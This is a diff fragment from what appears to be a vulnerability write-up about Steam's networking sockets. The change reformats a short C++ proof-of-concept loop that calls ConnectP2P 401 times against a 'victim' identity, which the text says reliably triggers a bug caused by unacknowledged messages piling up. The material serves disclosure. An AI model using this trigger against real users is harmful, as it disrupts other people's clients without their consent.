@@ -49,12 +49,11 @@ while (pMsg->ByteSize() < 8192)
 Additionally, due to the nature of SetRendezvousCommonFieldsAndSendSignal automatically adding reliable messages that haven't been ack'd to the message (m_vecUnackedOutboundMessages), simply rapidly calling ISteamNetworkingSockets::ConnectP2P in rapid succession is enough to trigger the bug
 The following code worked every attempt:
 
-```
-	for (int i = 0; i < 401; i++)
-	{
-		hConn[i] = Globals::g_pSteamNetworkingSockets->ConnectP2P(VictimNetworkingIdentity, i, 0, 0);
-	}
-
+```C++
+for (int i = 0; i < 401; i++)
+{
+	hConn[i] = Globals::g_pSteamNetworkingSockets->ConnectP2P(VictimNetworkingIdentity, i, 0, 0);
+}
 ```
 
 
